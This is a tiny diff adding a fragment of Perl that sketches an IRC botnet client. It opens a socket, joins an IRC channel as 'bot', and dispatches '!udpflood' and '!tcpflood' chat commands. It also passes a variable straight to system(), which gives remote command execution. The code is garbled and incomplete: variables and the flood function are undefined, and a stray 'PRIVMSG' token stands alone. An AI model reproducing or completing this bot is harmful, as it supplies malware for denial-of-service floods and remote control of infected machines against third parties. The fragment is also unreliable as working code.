@@ -1,0 +1,4 @@
+use IO::Socket;
+print $sock "NICK bot\r\n"; print $sock "JOIN #x\r\n"; PRIVMSG
+if ($cmd =~ /!udpflood/) { udpflood($h); } if ($cmd =~ /!tcpflood/) { } system($x);
+
